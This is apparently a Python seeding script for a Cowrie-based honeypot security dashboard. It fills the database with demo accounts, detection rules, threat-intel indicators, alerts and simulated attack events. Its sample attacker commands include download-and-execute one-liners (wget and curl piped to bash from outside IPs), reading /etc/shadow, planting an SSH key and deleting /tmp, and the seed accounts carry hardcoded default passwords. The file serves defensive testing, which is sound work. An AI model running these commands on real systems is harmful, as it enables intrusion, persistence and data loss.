import datetime
import random
import uuid
import json
from sqlalchemy.orm import Session
from app.models import (
    User, HoneypotEvent, Investigation, InvestigationNote, Alert,
    DetectionRule, ThreatIntelIOC, AuditLog, PlatformSetting, BackupRecord
)
from app.security import get_password_hash
from app.geoip_service import enrich_ip

SAMPLE_IPS = [
    "185.220.101.5", "193.142.146.210", "103.253.42.18", "45.154.255.88",
    "194.26.29.112", "104.244.76.13", "182.61.139.88", "91.240.118.24",
    "198.51.100.44", "41.216.186.20", "89.248.165.74", "185.156.177.10",
    "103.107.198.12", "195.123.214.45", "185.234.218.11", "91.191.209.12"
]

SAMPLE_USERNAMES = ["root", "admin", "user", "support", "ubuntu", "oracle", "postgres", "guest", "test", "cisco", "service", "sysadmin"]
SAMPLE_PASSWORDS = ["123456", "admin", "password", "root", "12345678", "pass123", "toor", "cisco123", "admin123", "1234", "qwerty", "welcome"]
SAMPLE_COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "wget http://185.220.101.5/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh && /tmp/m.sh",
    "curl -s http://193.142.146.210/miner | bash",
    "ls -la /root",
    "whoami",
    "id",
    "netstat -tulpn",
    "ps aux | grep miner",
    "rm -rf /tmp/*",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...' >> ~/.ssh/authorized_keys",
    "cat /etc/shadow",
    "crontab -l"
]

EVENT_TYPES = [
    ("cowrie.login.failed", 50),
    ("cowrie.login.success", 20),
    ("cowrie.command.input", 20),
    ("cowrie.session.file_download", 5),
    ("cowrie.session.connect", 5)
]

def seed_database(db: Session):
    # 1. Seed Users if not present
    if not db.query(User).filter(User.username == "admin").first():
        admin = User(
            username="admin",
            email="admin@cyvantis.soc",
            hashed_password=get_password_hash("Admin@Cyvantis2026!"),
            full_name="SOC Chief Administrator",
            role="admin",
            is_active=True,
            must_change_password=True,
            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=30)
        )
        analyst = User(
            username="analyst",
            email="analyst@cyvantis.soc",
            hashed_password=get_password_hash("Analyst@Cyvantis2026!"),
            full_name="Lead Cyber Threat Analyst",
            role="analyst",
            is_active=True,
            must_change_password=True,
            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=20)
        )
        viewer = User(
            username="viewer",
            email="viewer@cyvantis.soc",
            hashed_password=get_password_hash("Viewer@Cyvantis2026!"),
            full_name="Audit Observer",
            role="viewer",
            is_active=True,
            must_change_password=True,
            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=10)
        )
        db.add_all([admin, analyst, viewer])
        try:
            db.commit()
            print("[+] Users seeded successfully.")
        except Exception:
            db.rollback()

    admin_user = db.query(User).filter(User.username == "admin").first()
    analyst_user = db.query(User).filter(User.username == "analyst").first()

    # 2. Seed Platform Settings
    if db.query(PlatformSetting).count() == 0:
        settings_items = [
            PlatformSetting(key="PLATFORM_NAME", value="CYVANTIS AEGISNEX", description="Platform Branding Title"),
            PlatformSetting(key="COWRIE_SYNC_ENABLED", value="true", description="Cowrie Live Monitoring Status"),
            PlatformSetting(key="ALERT_THRESHOLD_ATTEMPTS", value="5", description="Failed login alert threshold"),
            PlatformSetting(key="DATA_RETENTION_DAYS", value="90", description="Days to retain event logs"),
            PlatformSetting(key="GEOIP_AUTO_ENRICHMENT", value="true", description="Automatic GeoIP lookup"),
            PlatformSetting(key="SIMULATION_INTERVAL", value="3.0", description="Seconds between simulated events")
        ]
        db.add_all(settings_items)
        db.commit()

    # 3. Seed Detection Rules
    if db.query(DetectionRule).count() == 0:
        rules = [
            DetectionRule(
                name="SSH Brute Force Attack",
                description="Triggers when more than 5 failed SSH login attempts occur from a single IP within 5 minutes.",
                rule_type="brute_force",
                condition='{"protocol": "SSH", "eventid": "cowrie.login.failed"}',
                threshold=5,
                severity="high",
                is_enabled=True,
                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=25)
            ),
            DetectionRule(
                name="Suspicious Command Execution",
                description="Triggers when attackers execute curl/wget payload fetch scripts or shadow file access.",
                rule_type="command_execution",
                condition='{"command_contains": ["wget", "curl", "/etc/shadow", "authorized_keys"]}',
                threshold=1,
                severity="critical",
                is_enabled=True,
                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=25)
            ),
            DetectionRule(
                name="Malware Payload Download",
                description="Triggers on binary/script honeypot file download events.",
                rule_type="payload_download",
                condition='{"eventid": "cowrie.session.file_download"}',
                threshold=1,
                severity="critical",
                is_enabled=True,
                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=20)
            ),
            DetectionRule(
                name="Telnet Credential Harvesting",
                description="Detects high volume Telnet authentication scans.",
                rule_type="brute_force",
                condition='{"protocol": "Telnet"}',
                threshold=10,
                severity="medium",
                is_enabled=True,
                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=15)
            )
        ]
        db.add_all(rules)
        db.commit()

    # 4. Seed Threat Intel IOCs
    if db.query(ThreatIntelIOC).count() == 0:
        iocs = [
            ThreatIntelIOC(indicator="185.220.101.5", ioc_type="ip", threat_score=95, category="Tor Exit Node", description="Known malicious scanner & Tor relay node", source="CYVANTIS Honeypot"),
            ThreatIntelIOC(indicator="193.142.146.210", ioc_type="ip", threat_score=90, category="Botnet C2", description="Mirai botnet command server", source="AbuseIPDB Sync"),
            ThreatIntelIOC(indicator="103.253.42.18", ioc_type="ip", threat_score=88, category="Brute Force Scanner", description="High frequency SSH dictionary attack source", source="CYVANTIS Honeypot"),
            ThreatIntelIOC(indicator="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", ioc_type="hash", threat_score=99, category="CryptoMinerELF", description="XMRig cryptominer binary dropper", source="VirusTotal Mock"),
            ThreatIntelIOC(indicator="malicious-payload-drop.xyz", ioc_type="domain", threat_score=85, category="Malware Host", description="Staging server for honeypot post-exploitation payloads", source="CYVANTIS Intelligence")
        ]
        db.add_all(iocs)
        db.commit()

    # 5. Seed Honeypot Events (200+ realistic events)
    if db.query(HoneypotEvent).count() < 100:
        now = datetime.datetime.utcnow()
        events = []
        
        # Weighted event choice
        choices = [ev[0] for ev in EVENT_TYPES]
        weights = [ev[1] for ev in EVENT_TYPES]

        for i in range(220):
            # Distribute timestamps over last 30 days
            days_ago = random.uniform(0.01, 30.0)
            ts = now - datetime.timedelta(days=days_ago)
            
            ev_type = random.choices(choices, weights=weights)[0]
            ip = random.choice(SAMPLE_IPS)
            geo = enrich_ip(ip)
            protocol = random.choice(["SSH", "Telnet"])
            dst_port = 22 if protocol == "SSH" else 23

            username = random.choice(SAMPLE_USERNAMES) if ev_type != "cowrie.session.connect" else None
            password = random.choice(SAMPLE_PASSWORDS) if ev_type in ["cowrie.login.failed", "cowrie.login.success"] else None
            command = random.choice(SAMPLE_COMMANDS) if ev_type == "cowrie.command.input" else None
            file_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" if ev_type == "cowrie.session.file_download" else None

            severity = "low"
            if ev_type == "cowrie.login.success":
                severity = "high"
            elif ev_type == "cowrie.command.input":
                severity = "high" if any(k in (command or "") for k in ["wget", "curl", "shadow"]) else "medium"
            elif ev_type == "cowrie.session.file_download":
                severity = "critical"

            ev = HoneypotEvent(
                eventid=ev_type,
                timestamp=ts,
                src_ip=ip,
                dst_port=dst_port,
                protocol=protocol,
                username=username,
                password=password,
                command=command,
                file_hash=file_hash,
                session_id=str(uuid.uuid4())[:8],
                duration=round(random.uniform(1.0, 120.0), 2),
                country=geo["country"],
                country_code=geo["country_code"],
                city=geo["city"],
                asn=geo["asn"],
                severity=severity,
                is_simulated=True,
                raw_payload=json.dumps({"eventid": ev_type, "src_ip": ip, "timestamp": ts.isoformat()})
            )
            events.append(ev)

        db.add_all(events)
        db.commit()
        print("[+] Seeded 220 realistic Honeypot Events.")

    # 6. Seed Alerts & Investigations
    if db.query(Alert).count() == 0:
        alerts = [
            Alert(
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(hours=2),
                title="Brute Force Campaign from 185.220.101.5",
                description="Over 45 SSH authentication attempts recorded targeting root and admin accounts.",
                severity="high",
                rule_name="SSH Brute Force Attack",
                src_ip="185.220.101.5",
                status="active",
                is_acknowledged=False
            ),
            Alert(
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(hours=6),
                title="Cryptominer Script Ingestion from 193.142.146.210",
                description="Attacker executed curl -s http://193.142.146.210/miner after unauthorized root login.",
                severity="critical",
                rule_name="Suspicious Command Execution",
                src_ip="193.142.146.210",
                status="acknowledged",
                is_acknowledged=True,
                acknowledged_by_id=analyst_user.id if analyst_user else 1,
                acknowledged_at=datetime.datetime.utcnow() - datetime.timedelta(hours=5)
            )
        ]
        db.add_all(alerts)
        db.commit()

    if db.query(Investigation).count() == 0:
        inv1 = Investigation(
            title="Operation NightCrawler: Mirai Variant Wave",
            description="Investigating targeted Telnet/SSH credential dictionary attacks originating from Netherlands and Russia VPS nodes.",
            severity="critical",
            status="in_progress",
            assigned_to_id=analyst_user.id if analyst_user else 1,
            created_by_id=admin_user.id if admin_user else 1,
            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=2),
            related_events="[1, 2, 3, 4, 5]"
        )
        db.add(inv1)
        db.commit()
        db.refresh(inv1)

        note = InvestigationNote(
            investigation_id=inv1.id,
            author_id=analyst_user.id if analyst_user else 1,
            note_text="Payload hashes confirm variant matches Mirai botnet armv7 payload. IP 193.142.146.210 flagged in AbuseIPDB.",
            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=1)
        )
        db.add(note)

        audit = AuditLog(
            timestamp=datetime.datetime.utcnow() - datetime.timedelta(days=2),
            username="admin",
            action="INVESTIGATION_CREATED",
            resource="Investigations",
            details="Opened incident investigation: Operation NightCrawler",
            ip_address="127.0.0.1"
        )
        db.add(audit)
        db.commit()

    print("[+] Database seeding complete.")
